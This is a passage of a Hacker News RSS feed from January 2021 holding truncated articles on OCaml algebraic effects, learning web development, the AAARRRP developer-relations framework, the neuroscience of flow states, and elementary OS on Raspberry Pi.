Taking a step back from our previous example, the fundamental issue
was that we were trying to mix <b>two</b> separate threads of control - one
for the core logic, and a separate one for the animation - in other
words, what we need is some kind of <b>non-local control flow</b>.
</p>

<p>
….as it just so happens, this is exactly the functionality that
algebraic effects provide.
</p>
</div>

<div id="outline-container-org7da722a">
<h4 id="org7da722a">What are algebraic effects?</h4>
<div id="text-org7da722a">
<p>
We'll sidestep a more detailed discussion of the theory, and instead
focus on the general picture for the end user: algebraic effects as
effectively "resumable" exceptions.<sup><a id="fnr.3" href="#fn.3">3</a></sup>
</p>

<p>
When defining an effect, the user specifies the type of the input
supplied by the caller, and the type of the output that the effect
should return on completion:
</p>


<p>
To perform an effect, we can use the builtin primitive perform:
</p>

<p>
At this point, the execution of the current program is stopped (much
like an exception), and control changes up the stack until the nearest
effect handler:
</p>
<div>
<pre><span>try</span> 
   <span>...</span>
   perform <span>(</span><span>A</span> 1<span>)</span>
   <span>...</span>   
<span>with</span> 
  <span>|</span> effect <span>(</span><span>A</span> v<span>)</span> k <span>-&gt;</span>
    <span>(* </span><span>control changes to here </span><span>*)</span>
</pre>
</div>
<p>
At the site of the effect handler, the user …</p></div></div></div></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://gopiandcode.uk/logs/log-bye-bye-monads-algebraic-effects.html">https://gopiandcode.uk/logs/log-bye-bye-monads-algebraic-effects.html</a></em></p>]]>
            </description>
            <link>https://gopiandcode.uk/logs/log-bye-bye-monads-algebraic-effects.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25670916</guid>
            <pubDate>Thu, 07 Jan 2021 13:45:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Learn to code in 2021, get hired, and have fun along the way]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25670779">thread link</a>) | @evantai
<br/>
January 7, 2021 | https://zerotomastery.io/blog/learn-to-code-in-2021-get-hired-and-have-fun-along-the-way | <a href="https://web.archive.org/web/*/https://zerotomastery.io/blog/learn-to-code-in-2021-get-hired-and-have-fun-along-the-way">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>For the past several years, I have been writing a guide (<a href="https://zerotomastery.io/blog/learn-to-code-in-2020-get-hired-and-have-fun-along-the-way" target="_blank" rel="follow">this is last year's edition</a>) that goes viral every year which gives you step by step instructions on how to become a Web Developer from scratch, <strong>for free</strong>. Thousands of students have followed these steps since then and <a href="https://zerotomastery.io/testimonials" target="_blank" rel="follow">have gotten hired</a>. However, a lot has changed since last year's edition, so I wanted to share with you the updated guide and changes for 2021 (with new resources)! The focus is on efficiency: Learn the right topics that are in demand right now so you can get hired as soon as possible.</p>
<p><strong>These are the steps that you should be taking if you want to learn to code in 2021, change your career, and become a Web Developer (or get into the tech industry).</strong></p>
<p>This is <strong>part 1</strong> of a 2 part series. You can read the second part <a href="https://zerotomastery.io/blog/dont-be-a-junior-developer" target="_blank" rel="follow">here</a>.</p>
<p>If you are a complete beginner, junior developer, or are curious about this industry, this post is for you. However, if you are an established developer, you may find some useful links in here as I list the best free resources to supercharge your skills, but I also wrote a post on <a href="https://zerotomastery.io/blog/developers-edge-how-to-become-a-senior-developer" target="_blank" rel="follow">how to become a senior software developer</a> that may be more useful to you.</p>
<p>If you find this post too long, you can skip over and start from the <strong>5 Months, Step By Step Section</strong>. But you’ll hurt my feelings… so you know, you can live with that guilt.</p>
<blockquote>
<h4>Ok you’re still here. Great! I like you already. Let’s keep going…</h4>
</blockquote>
<p>Using only free online courses, tutorials and free tools, you can gain a valuable skill that will allow you to be employed in a great industry that is rewarding, challenging, and with a lot of options to move around the world (more on this later). Best part? You don’t need a college degree or an expensive bootcamp. Nor do you need to give away part of your income once you get hired which some new schools are doing (which sounds great until you have to start giving away some of your paychecks).</p>
<p><strong>Important note:</strong> The post may seem like a step by step guide of what to do to become a developer, but if you look closely, it is a strategy that you can apply to any sort of learning.</p>
<p>Also... no pressure, but I don't want you getting mad at me for not telling you that if you want a downloadable version, you can sign up below and I'll email you a full PDF version of this guide that includes the month by month checklist!</p>

<h2>Why coding?</h2>
<p><img src="https://media.giphy.com/media/NWlBEcDW5evFS/source.gif"></p>
<center><i>one day you can build the best soccer goalie in the world…</i></center>
<p>Before we get into the steps you can take to become a developer, we must first dive into why you would want to go down this path. Every decision that will require significant time of your life should be justified. Time, after all, is the most important resource we have:</p>
<p><strong>A.</strong> You want to be working in an industry where there is a high demand for the skill and many possibilities to be in important roles at the top of the food chain.</p>
<p><strong>B.</strong> You love being location independent. You want a skill that allows you to go anywhere in the world and still be able to find a job easily. If you decide to move to Iceland tomorrow, you want to make sure that you won’t have issues finding a job.</p>
<p><strong>C.</strong> You’ve noticed the difference between 2010 and 2021 and how much of a technological progress we have made in those short 10 years. You want to be at the forefront of an industry that is impacting the world.</p>
<p><strong>D.</strong> The biggest industry growth in the last couple of years has been in the <a href="https://deepmind.com/blog/alphago-zero-learning-scratch/" target="_blank" rel="follow">artificial intelligence (Machine Learning)</a>, bio tech, autonomous cars, <a href="https://coinmarketcap.com/currencies/bitcoin/#charts" target="_blank" rel="follow">blockchain (Bitcoin)</a> space. We interact with technology on the daily, and you want to not be left behind in the dust as these take over our future. You want to understand and be able to pick up the skills underlying all of these: programming. Web Development is a great foot in the door to these industries.</p>
<p><strong>E.</strong> You think change is good, and learning should never stop. So why not do something new?</p>
<blockquote>
<h4>But I don’t have a computer science degree and I don’t even know how the internet works! Don’t worry, we will use that to your advantage. Keep reading…</h4>
</blockquote>
<p>When choosing a new career path here are some good must/nice to-haves:</p>
<p><strong>1.</strong> It must be relevant for the next 10+ years. This skill should be valued many years in the future guaranteeing you job security.</p>
<p><strong>2.</strong> Demand for people with this skill must be higher than the supply. The less available pool of skilled workers in the industry, the more control you can have over your job and companies you work for.</p>
<p><strong>3.</strong> Ability to have a high salary regardless of years in the industry. You don’t want to spend many years climbing the corporate ladder until you make a decent living.</p>
<p><strong>4.</strong> An industry that doesn’t require a specialized degree from a university. You don’t want to spend the next 4 years getting into debt and going to a graduate program before you start making money. And yes, I think there are better alternatives than going to an expensive coding bootcamp.</p>
<p><strong>5.</strong> Ability to catch up to the top performers in the industry in the shortest amount of time. Can little experience still get you employed? And can you close the gap as fast as possible to be considered a senior or an expert in the field?</p>
<p><strong>6.</strong> It must allow you to build foundational skills that will give you multiple career options no matter what the future holds. For example, by learning to code, you’re able to better understand new up-coming technologies like distributed applications, data science, machine learning (AI), and cloud computing, and choose which field you want to jump into next.</p>
<p><strong>7.</strong> Have fun. The most important one. Can you see yourself doing this 40 hours a week for a long time?</p>
<p>Coding hits every one of the points above in my experience. Your mileage may vary.</p>
<p>One of my favourite books is titled <a href="http://calnewport.com/books/so-good/" target="_blank" rel="follow">So Good They Can’t Ignore You</a>. In there, the author argues that passion is a myth. You shouldn’t go into the travel industry because you are “passionate” about travel. Most people find passion by struggling and working hard to master a skill. Once people start acknowledging your valuable skills, and you are able to feel respected for these skills, that’s when you develop passion for what you do.</p>
<blockquote>
<h4>Still with me? I haven’t scared you off? Ok, we shall keep going then….</h4>
</blockquote>
<p><strong>IMPORTANT POINT READ IT</strong>: keep in mind that the first 2 months will feel like you are climbing an insurmountable mountain. Every tutorial, course or lesson you do will make you feel like you are the only person in the world that doesn’t know this stuff. Stay strong. You will get there and you will have more and more ‘AHA!’ moments as time progresses. We call this the Impostor Syndrome: you feel like you are the only one who doesn’t know this information and you are surrounded by self-doubt. Rest assured we all feel this way when we learn something new. This is good. This is how we know we are stetching our boundaries.</p>
<p>What you will learn at the end of it all is that being a good developer isn’t necessarily memorizing a whole bunch of documentation. It’s about learning how to solve problems using all of the tools that are available to you. It’s about being a problem solver and getting from a state of not knowing to knowing. This guide will help you get those skills.</p>
<h2>Who are you and why should I listen to you?</h2>
<p><img src="https://media.giphy.com/media/H7JD0pfyksePe/giphy.gif"></p>
<center><i>always wave back…</i></center>
<p>Wow, you’re direct, but I guess that’s a fair question. First off, I’m a senior software developer that has worked in various locations including Silicon Valley and Toronto at some of the top tech firms. I’ve been very fortunate in my career and for the past 3 years I have taught <a href="https://academy.zerotomastery.io/p/complete-web-developer-zero-to-mastery" target="_blank" rel="follow">400,000+ people around the world how to become developers from scratch</a>. Many of those Zero To Mastery graduates now work at companies like <a href="https://zerotomastery.io/testimonials" target="_blank" rel="follow">Google and Amazon</a>. But I wasn’t born a computer wiz. I didn’t graduate with a computer science degree. I am completely self-taught.</p>
<p><em>P.S. This part is all about me, so if you don’t care (totally fair point), just skip this section. I’ll get over it eventually.</em></p>
<p>It all started many years ago…I wanted a career change and decided to teach myself computer programming.</p>
<p>I spent the first month avoiding any tutorials or books. Instead, I spent this month looking at the best way for me to learn and get hired. I wanted to be efficient, not waste my time and learn outdated technologies, or learn things that I would forget after a month. I studied other people’s experiences, looked at job postings, spoke to established developers, reviewed online courses, looked at bootcamps, and even read articles by futurists on where we will be with technology in 20 years. Based on those, I created a curriculum for myself focused on efficiency: <strong>The critical amount of learning in order to be employable in the shortest amount of time.</strong></p>
<p>If you love the works of <strong>Tim Ferriss</strong> as much as I do, you’re going to love this. The curriculum isn’t focused on doing the least amount of work. Instead, it is focused on working really hard at the things that matter most in order to be employed in the optimum way. This doesn’t mean doing the bare minimum and being hired as a junior developer. If you can work hard and skip the line by jumping straight into an intermediate developer role, that is a better outcome. Luckily for you, I have already sifted through everything for you.</p>
<p>Although I spent one month planning my studying instead of actually studying, it was a benefit in the long run because I wasn’t running blind. I knew where I was going, and I had a map to the finish line. You will too.</p>
<p>So yes, I have been where you are and I know what it takes. When I was getting started, I wish there was something like this that outlined things for me step by step. I also found many tutorials were taught by people with a lot of technical knowledge but without being able to properly teach a beginner. Alternatively, some courses were taught by people who took advantage of beginners not knowing much about the industry and selling them a course that sounds great but doesn't actually teach you how to succeed (we call these superficial skills). I’ve read and studied every single video, tutorial and course that time …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://zerotomastery.io/blog/learn-to-code-in-2021-get-hired-and-have-fun-along-the-way">https://zerotomastery.io/blog/learn-to-code-in-2021-get-hired-and-have-fun-along-the-way</a></em></p>]]>
            </description>
            <link>https://zerotomastery.io/blog/learn-to-code-in-2021-get-hired-and-have-fun-along-the-way</link>
            <guid isPermaLink="false">hacker-news-small-sites-25670779</guid>
            <pubDate>Thu, 07 Jan 2021 13:32:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Aaarrrp Developer Relations Strategy Framework]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25670758">thread link</a>) | @mooreds
<br/>
January 7, 2021 | https://www.leggetter.co.uk/aaarrrp/ | <a href="https://web.archive.org/web/*/https://www.leggetter.co.uk/aaarrrp/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main">
      <div>
        <div>
          <div id="content">
            

<p><strong>AAARRRP</strong> is a framework that helps you define your Developer Relations strategy. In its simplest form it provides a mechanism for <strong>mapping the company goals for developer relations at a company through to the activities that will help you achieve those goals</strong>. Since activities for some goals naturally feed into helping you achieve other goals you can adopt AAARRRP as a funnel or a loop.</p>

<h3>What does the acronym AAARRRP stand for?</h3>

<p>AAARRRP was adapted and inspired by <a href="https://www.slideshare.net/dmc500hats/startup-metrics-for-pirates-long-version">AARRR pirate metrics</a> in 2016 by <a href="https://twitter.com/leggetter">Phil Leggetter</a>. But, where as AARRR was focused on "Startup metrics for Product Marketing and Product Management" and stood for:</p>

<ul>
<li><strong>Acquisition</strong> - users come to the site from various channels</li>
<li><strong>Activation</strong> - users enjoy 1st visit: "happy user experience"</li>
<li><strong>Retention</strong> - users come back, visit multiple times</li>
<li><strong>Referral</strong> - users like product enough to refer others</li>
<li><strong>Revenue</strong> - users conduct some monetizing behavior</li>
</ul>

<p>AAARRRP is a framework for defining a Developer Relations strategy where each acronym identifies a potential business goal for a Developer Relations team. Additionally, the definitions change slightly and two further business goals, Awareness and Product, are added:</p>

<ul>
<li><strong>Awareness</strong> - users become aware of your product</li>
<li><strong>Acquisition</strong> - users signup for your product</li>
<li><strong>Activation</strong> - users successfully use your product</li>
<li><strong>Referral</strong> - users like product and company brand enough to refer others</li>
<li><strong>Revenue</strong> - users conduct some monetizing behavior</li>
<li><strong>Product</strong> - users and the developer relations team help define and build the product as well as gathering feedback from users to enhance your product</li>
</ul>

<h3>AAARRRP Goals</h3>

<p>Each acronym in AAARRRP represents a potential goal that your company can have for your Developer Relations team.</p>

<p>Here are a few different scenarios where a company will have different AAARRP goals:</p>

<ul>
<li>An <strong>API platform startup</strong> with an overarching goal of demonstrating clear interest in a product to their investors may have goals of Awareness, Acquisition and Referral to drive further awareness and acquisition.</li>
<li>A <strong>SaaS company with an API product offering</strong> may want to see increased Activation, Product enhancements that will enable that activation and Revenue from the increase in activations.
An open source framework may be looking to build a community through Referral to then help improve the Product offering through feedback and contribution.</li>
</ul>

<p>The company goals for a Developer Relations team may also change depending on a number of other factors.</p>

<ul>
<li>Has a product-market fit been determined?</li>
<li>Where is the product within the product development lifecycle?</li>
<li>What investment has been allocated to the Developer Relations program?</li>
<li>Who owns the Developer Relations budget within the organisation?</li>
<li>Are other teams delivering on some of the activities meaning Developer Relations should focus elsewhere?</li>
</ul>

<p><strong>The lifecycle of your product significantly influences Developer Relations goals</strong>. Early on in a product's existence it's important to determine product market fit; is there a clear demand for the product? Or to ensure the product meets some fundamental requirements such as following basic API guidelines, having documentation and sample code to help prospective customers get started, or demos to show what the product makes possible and as a sales-enablement tool. In later stages of product development the focus may be more on growth and the Developer Relations goals and associated activites will follow suit.</p>

<h3>Mapping AAARRRP Goals to Activities</h3>

<p>In it's simplest form AAARRRP can be seen as a mechanism of mapping company goals to Developer Relations activites. Activities are the pieces of work that a Developer Relations team will undertake and those activities will differ depending on the company goals.</p>

<p>If the Developer Relations goals focus on Product then activities are likely to be around documentation, sample code, libraries and SDKs. If Awareness and Acquisition are the goals then blog content, events, webinars, live streams (e.g. Twitch) and talk are the types of activities that will align with those goals.</p>

<p>The image below (from <a href="https://docs.google.com/spreadsheets/d/1HeKG9-h2yT4ahpaSsq6_6z6uDt7RWVtlRcj7jBMxEQI/edit#gid=0">a Nexmo AAARRRP Google Sheet</a>) shows the work we did a Nexmo in 2016 to 2017 where are goals were <strong>Product</strong>, <strong>Awareness</strong> and <strong>Activation</strong> with Product and Awareness being the priority goals.</p>

<p><img src="https://www.leggetter.co.uk/images/aaarrrp/aaarrrp-goal-to-activity-mapping.png" alt="Mapping AAARRRP Goals to Activities"></p>

<p>We added some additional columns to the spreadsheet:</p>

<ul>
<li><strong>Product Weighting</strong>: to provide a deeper indication of how well the activity aligned with the Product goal</li>
<li><strong>Awareness Weighting</strong>: to provide a deeper indication of how well the activity aligned with the Awareness goal</li>
<li><strong>Goal Alignment</strong>: counting how many of the goals (Awareness, Activation &amp; Product) the activity aligned with</li>
<li><strong>Score</strong>: A forumla to help us identify which activities we should choose (<code>(Product Weighting + Awareness Weighting) * Goal Alignment</code>).</li>
</ul>

<p>This helped us identify that we should focus on the following to achieve the company goals:</p>

<ul>
<li>Docs -&gt; Tutorials</li>
<li>Sample Apps</li>
<li>Blog -&gt; Tutorials</li>
<li>Events -&gt; Hackathons</li>
</ul>

<h3>An Introduction to AAARRRP (Video)</h3>

<p>The following description and video is from a talk given at DevRelCon London 2016.</p>

<blockquote>
<p>Building a DevRel programme is hard. What are the goals of the programme, how do they align with the company goals, what activities should the new Developer Relations team undertake, how do those activities help other departments within the company and how should the success of the team be measured?</p>

<p>In this talk from DevRelCon London 2016, Phil Leggetter describes his AAARRRP framework for developer relations strategy.</p>
</blockquote>

<p>
    <iframe width="560" height="315" src="https://www.youtube.com/embed/i7EZDYYfFmc" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
</p>

<h3>AAARRRP Resources</h3>

<ul>
<li><a href="https://devrel.net/strategy-and-metrics/introducing-aaarrrp-devrel-strategy">Introducing the AAARRRP devrel strategy framework on devrel.net</a></li>
<li><a href="https://docs.google.com/spreadsheets/d/1nUGvs7cmN9shWcA57cIESVqHuXliNa7NywXGviCuwNE/edit#gid=0">AAARRRP Google Sheets template</a></li>
<li><a href="https://docs.google.com/spreadsheets/d/1HeKG9-h2yT4ahpaSsq6_6z6uDt7RWVtlRcj7jBMxEQI/edit?usp=sharing">AAARRRP applied at Nexmo: 2016 - 2017</a></li>
<li><a href="https://www.leggetter.co.uk/2016/02/03/defining-developer-relations.html">Original "Defining Developer Relations" blog post</a></li>
</ul>

          </div>
        </div>
      </div>
    </div></div>]]>
            </description>
            <link>https://www.leggetter.co.uk/aaarrrp/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25670758</guid>
            <pubDate>Thu, 07 Jan 2021 13:29:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Neurology of Flow States]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25670675">thread link</a>) | @kawera
<br/>
January 7, 2021 | http://m.nautil.us/issue/91/the-amazing-brain/the-neurology-of-flow-states | <a href="https://web.archive.org/web/*/http://m.nautil.us/issue/91/the-amazing-brain/the-neurology-of-flow-states">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
			<p><span>D</span>on’t look at the clock! Now tell me: How much time has passed since you first logged on to your computer today? Time may be a property of physics, but it is also a property of the mind, which ultimately makes it a product of the brain. Time measures out and shapes our lives, and how we live our lives in turn affects how we perceive the passage of time. Your sense of time is malleable and subjective—it changes in response to changing contexts and input, and it can be distorted when the brain is damaged, or affected by drugs, disease, sleep deprivation, or naturally altered states of consciousness.&nbsp;However, a new set of neuroscience research findings suggests that losing track of time is also intimately bound up with creativity, beauty, and rapture.</p> <p>Time is most commonly manipulated by the kinds of things we do to fill it. When our minds are under-stimulated, time often feels like it is moving in slow motion, as in the scene in <i>The Simpsons</i> where Bart is made to lick envelopes for Principal Skinner all afternoon and groans when the clock starts ticking backward. On the other hand, when we are fully engaged, especially in the kind of “flow state” familiar to artists, athletes, and other top performers, our sense of time appears to speed up, or even to disappear entirely.</p> <p>Many people describe being “enchanted” or “transfixed” when watching a live performance or viewing their favorite work of art. For example, when exploring the European paintings section of the Metropolitan Museum of Art, I enter into a kind of dissociated, transcendent state, which many people report experiencing. All of our cares and worries disappear and time seems to stand still or fade away as we become lost in the world of the story, or work of art, or the virtuosity of the performer. This loss of time-awareness mirrors the process occurring in the brains of the performers or artists while they create.</p><blockquote><p>The inner critic must be shut down, and the inner Picasso turned up.</p> </blockquote><p>During what psychologists call “flow states,” where one is completely immersed and absorbed in a mental or physical act, people often report an altered sense of time, place, and self. It’s a transportive and pleasurable experience that people seek to achieve, and that neuroscience is now seeking to understand. A great example of flow state is found in many improvised art forms, from music to acting to comedy to poetry, also known as “spontaneous creativity.” Improvisation is a highly complex form of creative behavior that justly inspires our awe and admiration. The ability to improvise requires cognitive flexibility, divergent thinking and discipline-specific skills, and it improves with training.<br></p> <p>Not surprisingly, the frontal regions of the brain that have been shown to be involved in time perception and impulse control are also involved in spontaneous creativity. Improvisation appears to take place in an altered state of mind/brain, and studies of the neural mechanisms of musical improvisation have identified a network of prefrontal brain regions linked to improvisation. The creative act of improvisation, at least in the musical realm, appears to be a result of changing patterns of activity in two key areas of the prefrontal cortex (PFC).</p><div>
<article>
<p><a href="http://m.nautil.us/issue/6/Secret%20Codes/cant-remember-your-password" data-trval="cant-remember-your-password" data-trlbl="foc_rec" data-tract="internal_art">
<img src="http://static.nautil.us/1579_ed4227734ed75d343320b6a5fd16ce57.png" alt="Sapolsky_TH-F1" width="314" height="177">
</a>
</p>
<div>
<p><span>
<span>

<span><a href="http://m.nautil.us/term/f/Neuroscience">Also in Neuroscience</a></span>&nbsp;&nbsp;</span>
</span></p><h4><a href="http://m.nautil.us/issue/6/Secret%20Codes/cant-remember-your-password" data-trval="cant-remember-your-password" data-trlbl="foc_rec" data-tract="internal_art">Can’t Remember Your Password?</a></h4>
<p>By Virginia Hughes</p>
<p>
In this month’s Nautilus story, “Safecracking the Brain,” I dug into the work of two research groups that are stealing tips from cryptology to better understand how our brains work. While reporting that story, I came across a scientist who’s...<strong><a href="http://m.nautil.us/issue/6/Secret%20Codes/cant-remember-your-password" data-trval="cant-remember-your-password" data-trlbl="foc_rec" data-tract="internal_art">READ MORE</a></strong>
</p>

</div>

</article>
</div> <p>During musical improvisation, in jazz or freestyle rap, studies show a distinctive increase in medial prefrontal cortex activation. The medial prefrontal cortex (mPFC) is a brain area known to be involved in intentional, internally generated self-expression and the pursuit of goal-oriented behaviors. This makes sense, since improvised performance requires you to come up with new material in a rapid stream, and deploy it just as quickly for a listening or watching audience. The other aspect to this pattern is a decrease in lateral orbitofrontal cortex and dorsolateral prefrontal cortex activation (DLPFC). The lateral orbitofrontal cortex (OFC) and dorsolateral prefrontal cortex are brain areas involved in conscious self-monitoring, effortful problem solving, focused attention, and evaluation and regulation of goal-directed or planned behaviors. These lateral areas assess whether behaviors conform to social norms, and exert inhibitory control over inappropriate or maladaptive behavior. But as any skilled performer will tell you, inhibitions are the enemy of improvisation.</p> <p>When mPFC activation is turned up, it encourages the internal generation of ideas. And when lateral PFC brain areas are simultaneously turned down, it allows novel thoughts and behaviors to emerge uninhibited, leading to divergent thinking and unfiltered creativity. In other words, the inner critic must be shut down, and the inner Picasso turned up. Deactivation of lateral PFC regions is associated with free-floating, defocused attention, allowing spontaneous associations between ideas to arise, and sudden realizations or insights to occur. Creativity appears to occur when the DLPFC decreases its regulation of the contents of consciousness, allowing for unconscious, unfiltered, or random sensations and thoughts to arise in the flow state. Just as children will play more wildly when the teacher isn’t watching, when we reduce the influence of the DLPFC on our behavior, it allows us to think more like artists.</p><blockquote><p>Improvisation appears to take place in an altered state of mind.</p> </blockquote><p>Future research could explore whether this pattern of brain activity is in fact a neural signature of improvisation that occurs across all art forms, for instance during painting, theater, comedy, and dance improvisation, or whether the signature is unique to the musical and verbal forms it has been found in so far. When the lateral PFC regions—where our sense of agency is created after ongoing actions take place—decrease in activation, a performer’s moment-to-moment decisions and actions may feel as if they are occurring outside of time and without conscious intention, as if they are “coming from somewhere else.” This is consistent with the sentiment many artists express that their creative process is being directed by a “muse” or outside agent.<br></p> <p>However, improvising performers are not oblivious; momentary “check-ins” to see how your performance is going can provide necessary environmental (or audience) feedback, helping to revise your approach and optimize performance in real-time. Creative thought also involves the “default mode network” (DMN), a set of brain regions active when attention is directed internally and suppressed when a person engages in externally directed tasks. The DMN is active when you’re daydreaming, but not when you’re filling out an application form, which requires executive control areas like the DLFPC. Improvisation requires a balance in activation between these two networks, reflecting the extent to which creative thought and behavior needs to be responsive to environmental input, and constrained by certain rules to meet the specific goals of the task at hand. But if you become overly self-aware or self-conscious for too long, you can lose the flow state and the performance will suffer. Of course, you don’t need a cognitive neuroscientist to tell you that. Just listen to Eminem:</p> <p>You better lose yourself in the music, the moment<br>You own it, you better never let it go<br>You only get one shot, do not miss your chance to blow<br>This opportunity comes once in a lifetime&nbsp;&nbsp;</p> <p>Luckily, you do not need to be able to improvise (or take drugs) to achieve flow states. Deactivation of the lateral PFC also occurs during other altered states of consciousness such as meditation, hypnosis, and daydreaming. And a similar pattern of dissociated activation in PFC has been identified during REM sleep, where dreaming usually occurs. Dreaming involves unplanned, irrational associations, defocused attention, an altered sense of time, and a feeling of lack of agency or volitional control (with the exception of lucid dreaming). These same characteristics are associated with creativity when one is fully awake.</p> <p>The sense of time passing, producing its changes and progressions, is a capacity our brains evolved for adaptive reasons. How long have I been sleeping? How soon do the kids need to eat? How fast will I have to walk to make it home before dark? Keeping track of time is something we do instinctively, and our instincts have recently been supplemented by cultural inventions such as clocks and calendars, which train our brains to map its instincts onto scales and increments. However, we have also evolved the ability to turn off this constant time-keeping, in moments of artistic rapture or contemplation, and that adaptive sense of timelessness gives our lives much of its beauty and meaning. How we choose to spend our time, which remains our most limited and valuable resource, is one of the greatest gifts, and responsibilities, we are given.</p><p><i>Heather Berlin, Ph.D., MPH is a cognitive neuroscientist and assistant professor of psychiatry at the Icahn School of Medicine at Mount Sinai. She practices clinical neuropsychology at Weill Cornell Medicine in the Department of Neurological Surgery, and is a Visiting Scholar at the New York Psychoanalytic Society and Institute. She hosts Startalk All-Stars with Neil DeGrasse Tyson, and has hosted series on PBS and the Discovery Channel.</i></p><p><i>Lead image: Ricardo Ferrando / Shutterstock</i></p><p><i>This article first appeared online in our “Coordinates” issue in June, 2018.</i></p>
			



						
			

		</div></div>]]>
            </description>
            <link>http://m.nautil.us/issue/91/the-amazing-brain/the-neurology-of-flow-states</link>
            <guid isPermaLink="false">hacker-news-small-sites-25670675</guid>
            <pubDate>Thu, 07 Jan 2021 13:21:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Elementary OS launches early access Raspberry Pi builds]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25670591">thread link</a>) | @j-james
<br/>
January 7, 2021 | https://blog.elementary.io/elementary-os-on-raspberry-pi/ | <a href="https://web.archive.org/web/*/https://blog.elementary.io/elementary-os-on-raspberry-pi/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
  
  <header>
    
    
      <h2>



   Continuing our experimental Early Access&nbsp;builds

</h2>
    

    



<div>
  <p><img srcset="https://www.gravatar.com/avatar/41275ecc8271aca852ce2c0ff72d2610?s=96&amp;d=blank 2x" src="https://www.gravatar.com/avatar/41275ecc8271aca852ce2c0ff72d2610?s=48&amp;d=blank" alt="Avatar for Cassidy James Blaede">
  </p>
  
  <p><time datetime="2020-12-04">Fri, Dec  4, 2020</time>
  
    <span title="Estimated read time">
  
  5 min read
</span>


  
</p></div>


    


  </header>

  <section>
    <p>Following our <a href="https://blog.elementary.io/elementary-os-on-pinebook-pro">efforts to bring elementary OS to the ARM-based Pinebook Pro</a>, we’ve added experimental builds for the ARM-based Raspberry Pi 4 series—including the recently-launched Raspberry Pi 400—to our <a rel="nofollow noopener noreferrer" target="_blank" href="https://builds.elementary.io/">Early Access</a> program. Like Pinebook Pro builds, Raspberry Pi support is considered an experiment and is not something we have committed to officially support indefinitely. However, if you’re one of the many folks with a Raspberry Pi 4 sitting around and wanted to see how a full, modern desktop operating system runs, elementary OS is now an option!</p>

<figure>
  <p><img src="https://blog.elementary.io/images/elementary-os-on-raspberry-pi/desktop.jpg" alt="Raspberry Pi 4 running elementary OS"></p>
  <figcaption>My current desktop, powered by a Raspberry Pi 4 running elementary OS</figcaption>
</figure>

<p>Personally, I typically use Raspberry Pi 4 as a network device, e.g. a DNS server and for network-attached storage. However, I’ve been using elementary OS builds on it for the past week, and I’m impressed. While it won’t compete experience-wise with a high end desktop, it is a real option for casual computing, development, and writing. In fact, this blog post was written entirely on my Raspberry Pi 4 running elementary OS. It would even be possible to run the same network services on the hardware from within elementary OS just so you get a nice modern GUI when doing any local management.</p>

<p>Like with <a href="https://blog.elementary.io/elementary-os-on-pinebook-pro">Pinebook Pro</a>, there are some things you should know if you plan to use elementary OS Early Access builds on Raspberry Pi:</p>

<h2 id="kernel">Kernel</h2>

<p>Since Ubuntu has released Raspberry Pi images, we are able to rely on that work to ship a supported and updated kernel. Thanks to all of the folks at Canonical and in the Ubuntu community who have worked to make that happen!</p>

<h2 id="performance">Performance</h2>

<p>elementary OS on Raspberry Pi 4 is not going to match the polished experience of a full modern desktop computer, largely due to our current software stack. GTK3 does not offer GPU-accelerated animations, so animations within apps are less smooth than we would like. Still, for a computer coming in at under $100, it’s impressive and perfectly usable for several tasks.</p>

<p>There are also some things you can do to improve performance. We would definitely recommend using some sort of cooling with your Raspberry Pi, whether that’s a a heatsink and fan (like the recently-announced <a rel="nofollow noopener noreferrer" target="_blank" href="https://www.raspberrypi.org/blog/new-raspberry-pi-4-case-fan/">Raspberry Pi 4 Case Fan</a>), or a passive case like one from <a rel="nofollow noopener noreferrer" target="_blank" href="https://flirc.tv/">Flirc</a>—my favorite for its looks and silence. Since Raspberry Pi 4 tends to throttle due to heat under desktop loads, cooling will help it stay more responsive. We also recommend trying USB3 storage as your boot drive, as it should be faster than a microSD card. Using a 1080p (or lower) resolution also works a fair bit better than trying to push a 1440p or 4K display, but your mileage may vary based on your use case.</p>

<h2 id="supported-raspberry-pi-models">Supported Raspberry Pi Models</h2>

<p>We recommend Raspberry Pi 4 or Raspberry Pi 400 with 4 GB RAM at a minimum—but the more, the better. (We don’t even recommend less than 8 GB for computers with much faster CPUs, graphics, and storage.)</p>

<p>Older models of Raspberry Pi (like the original, Raspberry Pi Zero, Raspberry Pi 2 series, and Raspberry Pi 3 series) are not supported; elementary OS requires the faster processor, additional RAM, and 64-bit architecture of the Raspberry Pi 4 series. For older models, we recommend sticking to Raspberry Pi OS or a “headless” OS like Ubuntu Server.</p>

<h2 id="run-elementary-os-on-raspberry-pi">Run elementary OS on Raspberry Pi</h2>

<p>In its current state, we would not consider elementary OS on Raspberry Pi as polished of an experience as running on well-supported AMD- or Intel-based hardware.</p>

